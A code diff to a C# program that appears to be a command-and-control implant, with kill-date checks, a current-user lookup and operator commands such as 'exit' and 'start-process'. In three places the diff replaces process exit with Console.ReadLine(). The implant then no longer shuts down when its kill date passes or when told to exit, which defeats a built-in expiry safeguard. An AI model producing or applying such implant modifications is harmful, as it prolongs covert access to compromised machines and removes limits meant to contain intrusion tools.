@@ -187,7 +187,7 @@ public class Program
     DateTime now = DateTime.Now;
     DateTime killDate = Convert.ToDateTime("#REPLACEKILLDATE#");
     if (killDate < now){
-      System.Environment.Exit(1);
+      Console.ReadLine();
     }
         
 		var u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
@@ -316,7 +316,7 @@ public class Program
       DateTime now = DateTime.Now;
       DateTime killDate = Convert.ToDateTime(KillDate);
       if (killDate < now){
-        System.Environment.Exit(1);
+        Console.ReadLine();
       }
       string output = "";
       try {
@@ -443,7 +443,7 @@ public class Program
             }
             
             if (c.ToLower().StartsWith("exit")){
-                System.Environment.Exit(1);
+              Console.ReadLine();
             }
             
             if (c.ToLower().StartsWith("start-process")){
